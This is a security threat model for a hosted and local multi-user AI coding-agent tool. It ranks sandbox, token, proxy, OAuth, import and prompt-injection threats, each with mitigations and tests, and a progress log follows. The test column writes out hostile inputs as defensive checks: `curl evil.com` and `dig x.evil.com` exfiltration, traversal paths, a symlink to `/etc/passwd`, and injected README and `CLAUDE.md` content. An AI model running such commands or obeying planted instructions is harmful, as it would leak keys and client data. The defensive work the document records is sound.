# Threat model: hosted Sandwich

Written from an independent security review of the hosted design (2026-10-13). Each threat has an attacker, a mitigation to build, and a test that must exist before the gate it belongs to. Status column is updated as work lands.

**Attackers:** anonymous link holder, invited guest, malicious host, other tenant, outsider.

**Assets:** the host's provider API keys; the key-encryption key (KEK) and vault; the per-session proxy token; client-confidential chat, workspace, memory and transcripts; our compute bill and IP reputation.

**Trust boundaries:** (1) internet to control plane, (2) internet to session proxy to worker, (3) worker to agent (same sandbox), (4) sandbox to proxy and egress, (5) tenant to tenant, (6) host to guest.

## Threats, ranked

| # | Sev | Threat | Mitigation to build | Test | Task | Status |
|---|---|---|---|---|---|---|
| 1 | Critical | Sandbox escape or cross-tenant network reach (shared kernel, same private network, metadata IP) | microVM-class isolation per session, per-tenant network, no machine-to-machine or metadata route, agent unprivileged with caps dropped, local-process driver refuses to run in production | From approved shell in tenant A: scan private network, hit metadata IP and tenant B's worker (all fail); container-escape audit tools | T11, T16 | open |
| 2 | Critical | Worker holds all authority; the agent shares its user and files, so approved shell can edit the DB, mint tokens, raise caps | Authority (tokens, roles, caps, budget) in the control plane; worker is a relay with a signed identity per connection; agent under a different uid or container | With approved shell, edit the worker DB and promote a member: control plane still denies | T4, T7 | open |
| 3 | Critical | Proxy token in the sandbox environment becomes an open relay for the host's key | Token bound to the sandbox (source and machine id), minutes-long TTL, exact path and model allowlist, `max_tokens` clamp, concurrency cap, cost reserved before forwarding, streams cut at budget | Replay token from outside (403); 50 parallel calls at 99% of budget never exceed the cap; disallowed model and path (403) | T9 | open |
| 4 | Critical | Vault or KEK compromise via any web-tier bug | Web tier cannot decrypt; only the proxy service can; KEK in a KMS; AES-GCM with random nonce and AAD `userId|keyId|version`; show key once, then last 4; revoke and rotate; v1 keeps keys per session only | With web-tier credentials attempt a decrypt (impossible); swap ciphertext between users (tag fails) | T9 | open |
| 5 | High | Prompt injection leads to data or token exfiltration | Egress allowlist enforced outside the sandbox at IP level, DNS only via our resolver, no pastebin-class hosts | Approved `curl evil.com` and `dig x.evil.com` fail; planted README injection yields no egress | T16 | open |
| 6 | High | Codex has no approvals and its sandbox may not work in a container; blanket `/allow` removes the gate | Claude only at launch; Codex sandbox asserted at boot or refuse to start; no `/allow` for Bash and Write in the hosted build | Boot Codex in the real driver: `touch /etc/x` and `curl` both fail | T1, T16 | open |
| 7 | High | Session proxy and WebSocket: trusted `x-forwarded-*`, host-header routing, request smuggling, direct hit on worker | Proxy overwrites all forwarded headers and strips hop-by-hop; route only on signed per-session hostname; worker on private interface requiring a signed header; Origin checked against the fixed session host | Smuggling fuzzer; spoofed `X-Forwarded-Host`; `Origin: evil`; direct-to-worker (all refused) | T3, T10 | open |
| 8 | High | Invite and guest links leak (URL query tokens are logged; forwarded links; permanent access) | Authenticate the WebSocket from a first message, never the URL; scrub logs; `Referrer-Policy: no-referrer`; per-IP redemption limits; short non-sliding TTL by default; live member list with one-click revoke | Grep all logs for a canary token after a run; redeem an invite twice (second fails) | T3, T10 | open |
| 9 | High | OAuth account takeover (email linking, missing state or PKCE) | Identity on `(provider, subject)`, never email; never auto-link; `state` bound to a pre-login cookie, PKCE S256, nonce, exact redirect; `__Host-` HttpOnly Secure SameSite=Lax cookie; rotate session id at login; GitHub scopes `read:user user:email` only | Replay callback with swapped `state`; unverified-email pre-registration then Google sign-in must not merge | T8 | open |
| 10 | Med-High | CSRF and cross-site WebSocket | SameSite=Lax; custom header or double-submit token on every state-changing route; Origin allowlist; re-auth to view or replace keys | Cross-origin form POST to key routes (403); foreign-Origin WebSocket closes | T6 | open |
| 11 | High | GitHub import: SSRF, zip bombs, symlinks, malicious `.git/config`, injection in repo content | Only `github.com/{owner}/{repo}`; fetch codeload tarball (no `git`); size and file-count caps; extract in a throwaway unprivileged fetcher; reject links that escape; never import `.git`; no submodules; no write scope | Tarballs with `../`, absolute paths, symlink to `/etc/passwd`; gzip bomb; `github.com.evil.com`; redirect to metadata address | T12 | built (T12); the throwaway unprivileged fetcher arrives with the container driver (T16), until then the import runs inside the control plane process |
| 12 | High | Proxy as SSRF pivot; provider error text leaks keys to guests | Fixed upstream origin, path allowlist, no redirects, strip client `Authorization`, `x-api-key`, `Host`; rewrite every upstream error to generic text and log the original server-side only | Paths `/v1/../admin` and `//evil.com/x` fail; fake upstream with 302 and a key-echoing 401 never reaches the worker | T3, T9 | open |
| 13 | High | Free compute abuse (miners, scanning, attack relay) | Invite-only beta; network use needs an approved op; egress allowlist; CPU, wall-clock and process caps; one concurrent session per account; session kill switch; per-account egress counters | `stress-ng`, a SYN scan and a third-party `curl` are throttled or blocked | T16, Checkpoint B | open |
| 14 | High | Cost runaway on the host's key (soft caps, global-only budget, no `maxTurns`, unbounded queue, SDK-reported cost from an untrusted worker) | Proxy is the only source of truth for spend; nonzero default caps per member and per session; `maxTurns`; bounded queue; control-plane-signed attribution header; per-member attribution advisory, session budget hard | Looping prompt stops at the cap within one call; a restart does not reset the budget | T1, T9 | open |
| 15 | Med-High | Logs, errors and telemetry leak keys or tokens | Redaction for key and token patterns; never log bodies on key and proxy routes; scrub error trackers | Plant a canary key, trigger every error path, grep logs, DB and chat | T3, T9 | open |
| 16 | Med-High | DoS: unauthenticated sockets uncounted, wake storms cost money, held sockets keep machines awake | Authenticate at the proxy before waking anything; "idle" means no agent activity; per-IP and per-session connection limits; slowloris timeouts; resume rate limit | 10k unauthenticated connections and a bad-token wake storm leave the sandbox asleep | T10 | open |
| 17 | Med-High | Multi-tenant leakage in the control plane (IDOR, reused volumes, shared config dir) | Tenant always from the authenticated principal; random verified volume ids, wipe or encrypt per-session; transcript store keyed `tenant/session/...` with prefix-scoped access | Fetch every route with another tenant's ids (all fail closed) | T11 | open |
| 18 | Medium | Retention and deletion leave copies (`.bak`, `.archive`, snapshots, backups, transcripts, logs); guests are data subjects | One delete job across all stores; crypto-shredding with a per-session data key; time-based retention; join screen saying who sees the chat and where it goes; Terms and Privacy that match the code | Delete a session, search storage, snapshots and logs for a canary string | T13, T14 | open |
| 19 | Medium | Host versus guests (reads everything, serves active content, plants injections) and guest versus host (burns key, social-engineers approvals, uploads malware) | Per-session subdomains on a separate registrable domain; strict CSP; downloads forced as `attachment`; agent output rendered as text only; default guest caps; visible "host can read everything" notice | Host-authored HTML cannot read another session's `localStorage` | T10, T14 | open |
| 20 | Medium | Supply chain (caret ranges, agent installs packages, base images) | Pin exact versions; `npm ci --ignore-scripts`; image digests and scanning; `npm audit` in CI; package installs through a mirror on the allowlist | CI fails on a new postinstall script or an unpinned dependency | T3 | open |

## Existing code that does not survive hosting

- `server.js`: owner token generated per boot and printed to the console, `EXPOSE_TOKEN` prints it; registry is a SQLite file in `~/.sandwich` on the agent's own filesystem; token in the WebSocket query string; `x-forwarded-host` and `x-forwarded-proto` trusted and the Origin check depends on them; default bind is localhost but a container needs a private interface plus a signed header; `allowed`, `sandbox`, `driver`, `queue`, `pending` live only in memory; `new Codex({})` falls back to `~/.codex/auth.json`; no `env`, `maxTurns` or tool restriction on the agent, and the child inherits the full process environment; cost and budget come from SDK self-reports and reset on restart; caps are soft with no default; socket caps apply only after auth and per worker; uncaught errors are swallowed and the stop message says "restart the server".
- `lib.mjs`: `sensitive` and `readScope` guard only Read, Glob and Grep, not Bash; the hidden-file rule would block `.github` and `.gitignore` in imported repos.
- `codex.mjs` and `server.js`: provider error text is broadcast to every guest.
- `SECURITY.md`: "trust anyone you invite", "no separation between members" and "not hardened for strangers" must be rewritten before outsiders use the hosted product.

## Security gates

**Before the first outside user (invite-only beta):** microVM-class isolation with two-tenant and network tests; authority outside the worker; bound, short-lived, allowlisted proxy token with a hard budget under parallel load; keys decryptable only by the proxy service with the KEK in a KMS; egress allowlist outside the sandbox; Claude only; proxy overwrites forwarded headers and the worker is not directly reachable; no tokens in URLs or logs; OAuth, CSRF and Origin tests; repo import tests; nonzero default caps, `maxTurns`, bounded queue, per-account concurrency, a kill switch; tenant isolation test on every route; Terms, Privacy, delete job and join notice that match the code; pinned dependencies and image digests.

**Before any paying user:** external penetration test or a second adversarial review of the first five items; incident runbook for key compromise; provider-side spend limits in onboarding; encrypted backups with a restore test and verified deletion; ledger written only by the proxy and reconciled with provider usage; DPA and retention policy; abuse and takedown process; vulnerability disclosure policy; load and wake-storm tests with alerting.

## Things not to build (from the review)

A long-lived key vault in v1 (hold the key per session instead); trusting `server.js` as the authority; Codex for guests and blanket `/allow` in the hosted build; path-based session URLs on the control-plane origin; arbitrary git URLs; a flat sandbox network; SDK-reported usage as the billing source; any secret in the sandbox; printing or logging owner tokens; permanent guest access; the GitHub `repo` scope or any push-back feature in v1.

## Progress log

- **T3 (worker hardening) done, with tests:** tokens no longer travel in URLs when `SANDWICH_STRICT_TOKENS=1` (first-message auth, short timeout, limit on unauthenticated sockets) (#8, #16 in part); forwarded headers are ignored unless `SANDWICH_TRUST_PROXY=1` (#7 in part); provider and SDK error text is replaced by a generic line in the chat (#12 in part, #15 in part); `Referrer-Policy: no-referrer`; the test runner supplies the owner token and fails if any server prints a token (#15); dependencies are pinned and install scripts are off, enforced by a test (#20). Still open for these rows: the proxy, microVM and control-plane halves of each mitigation.
- **T1 done:** Guarded and Trusted modes, default guest cap, per-turn tool limit, bounded queue, session budget (#6 in part, #14 in part).
- **T4 (privilege-split spike) result:**
  - *Found and fixed with a real agent:* the agent process inherited the worker's whole environment, so an approved shell command could print the owner token (reproduced with the real Claude agent, then fixed: the same command now prints `absent`). The agent now gets only an allowlisted environment (`agentEnv` in `lib.mjs`): no `SANDWICH_*`, no unrelated secrets; Codex gets the same.
  - *The SDK can do the user split:* it has a `spawnClaudeCodeProcess` option, so the worker can start the agent as another unprivileged user. Implemented as `spawnAs(uid, gid)` and switched on with `SANDWICH_AGENT_UID` / `SANDWICH_AGENT_GID`. Not yet used anywhere.
  - *Not proven yet:* that an approved shell command running as the other user cannot read or edit the worker's database. `privsplit.test.mjs` is written but needs Linux and root; this machine has neither WSL nor Docker, so it is skipped here. It must be run in the container driver environment (T16) before the Checkpoint B gate.
  - *Decision:* a user split inside one container is defense in depth, not the boundary. T7 (authority in the control plane) stays required, and the container driver should still prefer separating worker and agent where the host allows it.
  - Data folder is created `0700` and the database `0600` on POSIX systems.

# Threat model: local team plugin (bring your own Claude Code)

Written 2026-11-20 for the Claude Code plugin (`team.mjs`, `team-api.mjs`, `vault.mjs`, `plugin/`). The host runs the hub on their machine behind a Cloudflare quick tunnel. Each teammate's Claude Code talks to the hub from their own machine.

**Attackers:**
- a browser guest (for example, a client invited to watch)
- a teammate's Claude Code, or a teammate who is themselves hostile
- a malicious host or hub (the hub decides what text reaches every teammate's agent)
- anyone who holds the tunnel address

**Assets:**
- each person's machine, reached through their own Claude Code (files, shell, credentials)
- the host's Obsidian vault
- prompts and file names
- invite and session tokens (`teams.json` in the plugin's data folder)

**Trust boundaries:**
1. internet to hub, through the tunnel
2. hub to each teammate's Claude Code: the hooks' context and the MCP tool results
3. git remote to each working tree, through auto-pull
4. teammates' agents to the host's vault

| # | Sev | Threat | Mitigation | Test (`plugin.test.mjs`) | Status |
|---|---|---|---|---|---|
| 1 | Critical | A guest or teammate steers someone else's Claude Code, even while that person is away | Only the host, ops and members who joined with `/sandwich:join` reach the team API. Browser tokens get 403, and browser `/tell` is ops-only. All teammate text is framed as data, never instructions. A woken idle agent may only reply; no file or shell actions without its user. | browser guests cannot use the team API; direct message wakes (reply only) | done |
| 2 | High | Forged sender lines or fake Claude Code context tags inside a message | The hub stores every text as one line without control characters. The client re-cleans everything it gets from the hub (one line, capped, tag-shaped text removed), so a modified hub can't forge lines either. | cannot forge another sender's line; malicious hub's reply is cleaned | done |
| 3 | High | Auto-pull brings in a teammate's change to `CLAUDE.md`, `.claude/`, `.mcp.json`, `.vscode/` or git hook managers, which the next session obeys or runs | Commits touching those paths are never fast-forwarded automatically. The agent tells its user to review them and pull by hand. Other changes come in only as a fast-forward, and git never waits on a login prompt. | change to agent instructions is never pulled in unseen | done |
| 4 | High | Teammates' agents read beyond what the host meant to share from the vault, or write outside it | Only Markdown notes can be read, never hidden folders, and links are resolved so nothing outside the vault is reachable. Writes go only under `Sandwich/`: folders are created one level at a time and links are refused. Windows stream, device and trailing-dot names are refused. The host is asked to confirm before sharing, and can share a subfolder instead. | vault read-only outside Sandwich/; Windows tricks refused | done |
| 5 | Medium | Prompts or secrets leak to teammates | A prompt is shared only up to 160 characters, and not at all if it looks like it holds a key or password. `/sandwich:prompts off` shares only "working". Prompts are never posted to the browser chat. | prompts that look like they hold a secret are not shared | done |
| 6 | Medium | A teammate exhausts the host's machine | Per-member request limit; at most 3 open long polls per member and 200 in total; notes read at most 200 KB; `Sandwich/` capped at 2000 notes of 64 KB; claims capped at 50 paths per call and expire after 2 hours. | open long polls capped; vault quota | done |
| 7 | Medium | A malicious hub sends huge replies or attacker text | Hub replies over 1 MB are rejected. Hub text is cleaned and capped (see #2). `/sandwich:join` names the host and warns what joining shares. | malicious hub's reply is cleaned | done |
| 8 | Medium | A hostile teammate claims everything so others' edits are refused | The host or an op can `/kick` or `/revoke` them, which clears their claims. Claims expire after 2 hours without edits. The hooks let edits through when the hub can't be reached. | (manual) | accepted |
| 9 | Low | Owner token sits in plaintext in `teams.json` and in the start command's output | The file lives in the user's own profile (mode 600 where supported) and is deleted on uninstall. The owner link is shown only to the host. | (manual) | accepted |
| 10 | Low | Dependency advisories in the MCP SDK's bundled web server (express, hono, body-parser, qs, fast-uri) | Not reachable: the plugin uses the SDK's stdio transport only. Update with a non-forced `npm audit fix` as its own tested change. | `npm audit --omit=dev` | open |

Not covered yet: real Claude Code loading the plugin, the tunnel, two machines, macOS and Linux.
